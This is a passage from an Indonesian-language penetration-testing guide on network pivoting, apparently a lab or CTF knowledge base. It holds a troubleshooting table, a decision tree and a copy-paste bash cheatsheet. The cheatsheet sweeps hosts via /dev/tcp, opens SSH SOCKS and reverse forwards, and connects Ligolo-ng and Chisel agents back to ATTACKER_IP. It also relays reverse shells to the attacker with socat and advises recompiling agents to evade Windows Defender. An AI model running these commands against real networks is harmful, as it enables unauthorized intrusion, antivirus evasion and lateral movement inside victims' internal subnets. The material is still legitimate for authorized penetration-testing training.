|SSH timeout setelah idle|Keepalive tidak aktif|Tambah `-o ServerAliveInterval=60 -o ServerAliveCountMax=3`|
|Reverse shell tidak masuk|Target reach attacker via IP salah|Arahkan ke PIVOT_INTERNAL_IP, bukan ATTACKER_IP|
|DNS Leak di ProxyChains|`proxy_dns` tidak aktif|Uncomment `proxy_dns` di proxychains4.conf|
|Windows tolak agent.exe|Windows Defender detect|Compile ulang dengan custom flags, atau pakai Ligolo (lebih jarang detect)|
|Socat: `Address already in use`|Socket masih TIME_WAIT|Tambah `reuseaddr` parameter|
|`Operation not permitted` di ip tuntap|Tidak ada sudo|`sudo` sebelum command, atau jalankan sebagai root|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Dapat Shell di Pivot Host
│
├─ FASE 0: Deteksi
│   ├─ ip addr show → dual NIC? → Ada subnet internal
│   ├─ ip route → catat subnet internal
│   └─ ARP cache → host aktif di subnet internal
│
├─ PILIH METODE:
│   ├─ Punya SSH creds?          → FASE 1 (SSH -D/-L/-R)
│   ├─ Root di Parrot + file transfer? → FASE 2 (Ligolo-ng) ← TERBAIK
│   ├─ Hanya HTTP outbound?      → FASE 3 (Chisel Reverse)
│   ├─ Darurat, hanya nc/bash?   → FASE 4 (Netcat/Socat)
│   └─ Punya Meterpreter?        → FASE 5 (MSF Autoroute)
│
├─ SCANNING INTERNAL:
│   ├─ Via SOCKS (SSH/Chisel)    → proxychains4 nmap -sT -Pn -n
│   └─ Via Ligolo-ng             → nmap -sS langsung (lebih cepat)
│
├─ EXPLOITATION VIA TUNNEL:
│   ├─ Web  → proxychains4/langsung → <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
│   ├─ SMB  → proxychains4/langsung → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
│   ├─ SSH  → proxychains4/langsung → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
│   └─ AD   → proxychains4/langsung → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
│
└─ REVERSE SHELL:
    ├─ Via SSH -R    → Port di pivot forward ke attacker listener
    ├─ Via Ligolo    → listener_add di konsol → nc -lvnp di attacker
    └─ Via Socat     → Relay di pivot → forward ke attacker
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export ATTACKER_IP="10.10.14.50"
export PIVOT_IP="10.10.11.100"
export PIVOT_INTERNAL_IP="172.16.1.5"
export INTERNAL_SUBNET="172.16.1.0/24"
export TARGET_IP="172.16.1.20"

# === DETEKSI PIVOT HOST ===
ip -brief addr show                    # Interface list
ip route                               # Routing table
cat /proc/net/arp                      # ARP neighbors

# === HOST DISCOVERY ===
for i in $(seq 1 254); do (ping -c 1 -W 1 172.16.1.$i >/dev/null 2>&1 && echo "[+] $i") & done; wait
for i in $(seq 1 254); do (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/22" 2>/dev/null && echo "[+] SSH: 172.16.1.$i") & done; wait

# === SSH DYNAMIC SOCKS ===
ssh -D 1080 -f -N -o StrictHostKeyChecking=no user@$PIVOT_IP
ssh -D 1080 -i ~/pivoting/ssh/id_rsa -f -N -o StrictHostKeyChecking=no user@$PIVOT_IP

# === SSH LOCAL FORWARD ===
ssh -L 8080:$TARGET_IP:80 user@$PIVOT_IP -f -N -o StrictHostKeyChecking=no

# === SSH REMOTE FORWARD (receive reverse shell) ===
ssh -R 9001:127.0.0.1:4444 user@$PIVOT_IP -f -N -o StrictHostKeyChecking=no

# === LIGOLO-NG SETUP ===
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601                    # Attacker
./agent_linux -connect $ATTACKER_IP:11601 -ignore-cert &       # Pivot
# Di konsol: session → start
sudo ip route add $INTERNAL_SUBNET dev ligolo                  # Attacker

# === CHISEL ===
chisel server --port 8001 --reverse -v                         # Attacker
./chisel client $ATTACKER_IP:8001 R:socks &                   # Pivot (full SOCKS)
./chisel client $ATTACKER_IP:8001 R:9090:$TARGET_IP:80 &     # Pivot (single port)

# === PROXYCHAINS SCAN ===
proxychains4 nmap -sT -Pn -n -p 22,80,443,445,3389 $TARGET_IP
proxychains4 nxc smb $TARGET_IP -u '' -p '' --shares
proxychains4 curl http://$TARGET_IP/

# === LIGOLO SCAN (tanpa proxychains) ===
nmap -sS -Pn -sV -p- $TARGET_IP --open
nxc smb $TARGET_IP -u '' -p ''
evil-winrm -i $TARGET_IP -u user -p pass

# === SOCAT RELAY ===
socat TCP-LISTEN:8888,fork,reuseaddr TCP:$TARGET_IP:80 &       # Di pivot
socat TCP-LISTEN:5555,fork TCP:$ATTACKER_IP:4444 &             # Relay reverse shell

# === CLEANUP ===
pkill -f "ssh -D"; pkill -f "chisel"; pkill -f "socat TCP-LISTEN"
sudo ip route del $INTERNAL_SUBNET dev ligolo 2>/dev/null
sudo ip link set ligolo down; sudo ip tuntap del ligolo mode tun 2>/dev/null
```

---

> **➡️ NEXT:** Setelah berhasil setup tunnel dan bisa akses subnet internal, lanjutkan workflow sesuai service yang ditemukan di target internal:
> 
> - Web server ditemukan → **`<a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>`**
> - SMB/Windows target → **`<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`** via proxy
> - SSH Linux target → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`** via proxy
> - Active Directory DC → **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`** via proxy
> - Perlu lateral movement → **`<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`**
> 
> **← SEBELUMNYA:** **[⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)](/docs/password-cracking)** — Cracking hash yang ditemukan dari shares, shadow file, atau memory dump untuk mendapatkan credentials yang bisa dipakai di tunnel ini.